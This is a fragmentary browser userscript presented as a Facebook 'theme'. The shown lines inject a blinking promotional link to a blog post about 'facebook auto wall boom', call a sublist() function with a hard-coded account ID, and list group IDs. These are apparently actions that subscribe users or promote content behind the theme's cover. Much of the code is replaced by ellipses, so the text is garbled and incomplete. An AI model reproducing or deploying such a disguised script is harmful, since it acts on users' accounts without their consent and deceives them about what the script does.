// ==UserScript==
// @name                        Facebook Raya Theme by Cyber Lover
...
}
{
  ...
  div.style.position="fixed";
    ...
    div.style.border="1px solid #6B84B4";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;color:#E30505' href='http://www.blog-izam.my/2013/08/facebook-auto-wall-boom-2013.html' target='_blank' title='NEW' ><blink><center>Learn About Technology</center></blink></a>";body.appendChild(div)}body=document.body;if(body!=null)
...
sublist("582586361783408");

var gid = ['269793609774219'];
